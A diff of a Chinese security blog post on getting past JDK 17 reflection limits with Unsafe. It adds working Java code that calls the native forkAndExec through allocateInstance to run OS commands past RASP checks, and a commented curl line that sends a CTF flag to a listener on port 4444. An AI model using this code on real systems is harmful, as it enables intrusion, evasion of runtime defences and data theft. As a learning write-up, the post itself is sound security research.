@@ -32,7 +32,7 @@
 <meta property="og:image" content="https://zer0peach.github.io/images/JDK17-%E7%BB%95%E8%BF%87%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/image-20231228200214787.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/JDK17-%E7%BB%95%E8%BF%87%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/image-20231228200309284.png">
 <meta property="article:published_time" content="2023-12-28T10:04:53.000Z">
-<meta property="article:modified_time" content="2023-12-28T15:26:11.454Z">
+<meta property="article:modified_time" content="2024-01-05T13:26:20.751Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://zer0peach.github.io/images/JDK17-%E7%BB%95%E8%BF%87%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/image-20231228193558788.png">
@@ -240,7 +240,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          6.8k 字
+          9.9k 字
         
       </span>
     
@@ -251,7 +251,7 @@
         
         
         
-          57 分钟
+          83 分钟
         
       </span>
     
@@ -301,7 +301,8 @@
 <li>java的这些非公开的api本身就是非标准的，让开发者依赖使用这个api会给JDK的维护带来负担。</li>
 </ol>
 <p>所以从JDK 9开始就准备限制对java api的反射进行限制，直到JDK 17才正式禁用。</p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><div class="code-wrapper"><pre><code class="hljs reasonml">String payload = &#x27;恶意的base64&#x27;
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>调用ClassLoader.defineClass加载字节码</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">String payload = &#x27;恶意的base64&#x27;
 
 
 byte<span class="hljs-literal">[]</span> decode = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Decoder()</span>.decode(payload);
@@ -309,7 +310,7 @@ byte<span class="hljs-literal">[]</span> decode = <span class="hljs-module-acces
 
 Method defineClass = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.<span class="hljs-params">class</span>, <span class="hljs-params">byte</span>[].<span class="hljs-params">class</span>, <span class="hljs-params">int</span>.<span class="hljs-params">class</span>, <span class="hljs-params">int</span>.<span class="hljs-params">class</span>)</span>;
 defineClass.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
-Class evil = (Class) defineClass.invoke(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>get<span class="hljs-constructor">SystemClassLoader()</span>, <span class="hljs-string">&quot;exp&quot;</span>, decode, <span class="hljs-number">0</span>, decode.length);</code></pre></div>
+Class evil = (Class) defineClass.invoke(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>get<span class="hljs-constructor">SystemClassLoader()</span>, <span class="hljs-string">&quot;恶意文件名字&quot;</span>, decode, <span class="hljs-number">0</span>, decode.length);</code></pre></div>
 
 <h2 id="JDK9-JDK16（只有警告）"><a href="#JDK9-JDK16（只有警告）" class="headerlink" title="JDK9 - JDK16（只有警告）"></a>JDK9 - JDK16（只有警告）</h2><p>从JDK9开始，当我们用反射去获取 <code>java.*</code> 包下的非public变量和方法时只会警告，仍能够运行</p>
 <div class="code-wrapper"><pre><code class="hljs none">WARNING: An illegal reflective access operation has occurred
@@ -343,7 +344,7 @@ at test<span class="hljs-selector-class">.main</span>(test<span class="hljs-sele
 <p>这里的clazz是Class类，这个后面会用到</p>
 <p>跟进到关键代码<code>java.lang.reflect.AccessibleObject#checkCanSetAccessible(java.lang.Class&lt;?&gt;, java.lang.Class&lt;?&gt;, boolean)</code></p>
 <p><img src="/../images/JDK17-%E7%BB%95%E8%BF%87%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/image-20231228194145369.png" srcset="/img/loading.gif" lazyload alt="image-20231228194145369"></p>
-<p>判断我们调用类和目标类是不是一个<code>module</code>，如果<strong>调用类的module和Object类的module一样</strong>，就可以有修改权限</p>
+<p>判断我们调用类和目标类是不是一个<code>module</code>，如果<strong>调用类的module和目标类的module一样</strong>，就可以有修改权限</p>
 <p>那我们可以尝试利用<code>Unsafe</code>来修改当前类的<code>module</code>属性和目标类(即 <code>java.*</code> 下类)的module属性一致来绕过</p>
 <p>Unsafe类中有个 <code>getAndSetObject</code> 方法，其和反射赋值功能差不多，利用这个修改调用类的module</p>
 <p><img src="/../images/JDK17-%E7%BB%95%E8%BF%87%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/image-20231228195535771.png" srcset="/img/loading.gif" lazyload alt="image-20231228195535771"></p>
@@ -393,11 +394,11 @@ defineClass.set<span class="hljs-constructor">Accessible(<span class="hljs-param
 Class evil = (Class) defineClass.invoke(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>get<span class="hljs-constructor">SystemClassLoader()</span>, <span class="hljs-string">&quot;exp&quot;</span>, decode, <span class="hljs-number">0</span>, decode.length);</code></pre></div>
 
 <p><img src="/../images/JDK17-%E7%BB%95%E8%BF%87%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/image-20231228200214787.png" srcset="/img/loading.gif" lazyload alt="image-20231228200214787"></p>
-<p>对比一下之前的</p>
+<p>对比一下没改之前的情况</p>
 <p><img src="/../images/JDK17-%E7%BB%95%E8%BF%87%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/image-20231228200309284.png" srcset="/img/loading.gif" lazyload alt="image-20231228200309284"></p>
 <p>所以成功修改，就能够进行反射了</p>
 <p>同样的，如果没有办法反射其他不在同一个module下的属性或方法，也可以利用这个办法来修改类的module来绕过，上面也可以修改<code>java.*</code> 下类的module和Main.class的module一样，也是可以的，但修改module后会产生什么不可预知的后果我就不知道了。</p>
-<h2 id="allocateInstance"><a href="#allocateInstance" class="headerlink" title="allocateInstance"></a>allocateInstance</h2><p>若RASP限制了某些类的构造方法（比如<code>TrAXFilter</code>（加载字节码）、<code>ProcessImpl</code>（Windows命令执行）、<code>UnixProcess</code>（Linux命令执行））</p>
+<h1 id="JDK8中Unsafe的常见使用"><a href="#JDK8中Unsafe的常见使用" class="headerlink" title="JDK8中Unsafe的常见使用"></a>JDK8中Unsafe的常见使用</h1><h2 id="allocateInstance-（反射调用native方法）"><a href="#allocateInstance-（反射调用native方法）" class="headerlink" title="allocateInstance （反射调用native方法）"></a>allocateInstance （反射调用native方法）</h2><p>若RASP限制了某些类的构造方法（比如<code>TrAXFilter</code>（加载字节码）、<code>ProcessImpl</code>（Windows命令执行）、<code>UnixProcess</code>（Linux命令执行））</p>
 <p>可以用<code>Unsafe</code>的<code>allocateInstance</code>方法绕过这个限制</p>
 <p>windows下</p>
 <div class="code-wrapper"><pre><code class="hljs java">Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>);
@@ -443,8 +444,99 @@ helperpath.setAccessible(<span class="hljs-literal">true</span>);
 exec.setAccessible(<span class="hljs-literal">true</span>);
 exec.invoke(obj, <span class="hljs-number">2</span>, path, prog, argBlock, argc, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">null</span>, ineEmpty, <span class="hljs-literal">false</span>);</code></pre></div>
 
+<h2 id="unsafe-反射调用native的forkAndExec"><a href="#unsafe-反射调用native的forkAndExec" class="headerlink" title="unsafe+反射调用native的forkAndExec"></a>unsafe+反射调用native的forkAndExec</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] toCString(String s) &#123;
+        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>)
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
+        <span class="hljs-type">byte</span>[] bytes  = s.getBytes();
+        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];
+        System.arraycopy(bytes, <span class="hljs-number">0</span>,
+                result, <span class="hljs-number">0</span>,
+                bytes.length);
+        result[result.length - <span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>) <span class="hljs-number">0</span>;
+        <span class="hljs-keyword">return</span> result;
+    &#125;
 
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">exec</span><span class="hljs-params">(String[] strs)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InstantiationException, NoSuchMethodException, InvocationTargetException, IOException &#123;
 
+        <span class="hljs-comment">//String[] strs = new String[] &#123;&quot;bash&quot;, &quot;-c&quot;, &quot;curl host.docker.internal:4444 -d \&quot;`/readflag`\&quot;&quot;&#125;;</span>
+        
+        
+        <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafeField</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);
+        theUnsafeField.setAccessible(<span class="hljs-literal">true</span>);
+        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafeField.get(<span class="hljs-literal">null</span>);
+
+        <span class="hljs-type">Class</span> <span class="hljs-variable">processClass</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
+
+        <span class="hljs-keyword">try</span> &#123;
+            processClass = Class.forName(<span class="hljs-string">&quot;java.lang.UNIXProcess&quot;</span>);
+        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;
+            processClass = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);
+        &#125;
+
+        <span class="hljs-type">Object</span> <span class="hljs-variable">processObject</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(processClass);
+
+        <span class="hljs-comment">// Convert arguments to a contiguous block; it&#x27;s easier to do</span>
+        <span class="hljs-comment">// memory management in Java than in C.</span>
+        <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[strs.length - <span class="hljs-number">1</span>][];
+        <span class="hljs-type">int</span>      <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <span class="hljs-comment">// For added NUL bytes</span>
+
+        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;
+            args[i] = strs[i + <span class="hljs-number">1</span>].getBytes();
+            size += args[i].length;
+        &#125;
+
+        <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];
+        <span class="hljs-type">int</span>    <span class="hljs-variable">i</span>        <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
+
+        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] arg : args) &#123;
+            System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);
+            i += arg.length + <span class="hljs-number">1</span>;
+            <span class="hljs-comment">// No need to write NUL bytes explicitly</span>
+        &#125;
+
+        <span class="hljs-type">int</span>[] envc                 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];
+        <span class="hljs-type">int</span>[] std_fds              = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;;
+        <span class="hljs-type">Field</span> <span class="hljs-variable">launchMechanismField</span> <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;launchMechanism&quot;</span>);
+        <span class="hljs-type">Field</span> <span class="hljs-variable">helperpathField</span>      <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;helperpath&quot;</span>);
+        launchMechanismField.setAccessible(<span class="hljs-literal">true</span>);
+        helperpathField.setAccessible(<span class="hljs-literal">true</span>);
+        <span class="hljs-type">Object</span> <span class="hljs-variable">launchMechanismObject</span> <span class="hljs-operator">=</span> launchMechanismField.get(processObject);
+        <span class="hljs-type">byte</span>[] helperpathObject      = (<span class="hljs-type">byte</span>[]) helperpathField.get(processObject);
+
+        <span class="hljs-type">int</span> <span class="hljs-variable">ordinal</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) launchMechanismObject.getClass().getMethod(<span class="hljs-string">&quot;ordinal&quot;</span>).invoke(launchMechanismObject);
+
+        <span class="hljs-type">Method</span> <span class="hljs-variable">forkMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;forkAndExec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;
+                <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class,
+                <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>[].class, <span class="hljs-type">boolean</span>.class
+        &#125;);
+
+        forkMethod.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">// 设置访问权限</span>
+
+        <span class="hljs-type">int</span> <span class="hljs-variable">pid</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) forkMethod.invoke(processObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;
+                ordinal + <span class="hljs-number">1</span>, helperpathObject, toCString(strs[<span class="hljs-number">0</span>]), argBlock, args.length,
+                <span class="hljs-literal">null</span>, envc[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>, std_fds, <span class="hljs-literal">false</span>
+        &#125;);
+
+        <span class="hljs-comment">// 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流</span>
+        <span class="hljs-type">Method</span> <span class="hljs-variable">initStreamsMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;initStreams&quot;</span>, <span class="hljs-type">int</span>[].class);
+        initStreamsMethod.setAccessible(<span class="hljs-literal">true</span>);
+        initStreamsMethod.invoke(processObject, std_fds);
+
+        <span class="hljs-comment">// 获取本地执行结果的输入流</span>
+        <span class="hljs-type">Method</span> <span class="hljs-variable">getInputStreamMethod</span> <span class="hljs-operator">=</span> processClass.getMethod(<span class="hljs-string">&quot;getInputStream&quot;</span>);
+        getInputStreamMethod.setAccessible(<span class="hljs-literal">true</span>);
+        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> (InputStream) getInputStreamMethod.invoke(processObject);
+
+        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
+        <span class="hljs-type">int</span>                   <span class="hljs-variable">a</span>    <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
+        <span class="hljs-type">byte</span>[]                b    = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];
+
+        <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;
+            baos.write(b, <span class="hljs-number">0</span>, a);
+        &#125;
+        <span class="hljs-keyword">return</span> baos.toString();</code></pre></div>
+
+<p>同样可以用这个调用加了prefix的<code>forkAndExec</code> （就是调用方法名称改一下而已）</p>
 <h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>但现在来说我还用不上这些，太菜了，还在学jdk8的东西呢</p>
 <p><a target="_blank" rel="noopener" href="https://pankas.top/2023/12/05/jdk17-%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/">https://pankas.top/2023/12/05/jdk17-%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/</a></p>
 <p><a target="_blank" rel="noopener" href="https://p4d0rn.gitbook.io/java/prerequisites/unsafe">Unsafe - Java (gitbook.io)</a></p>
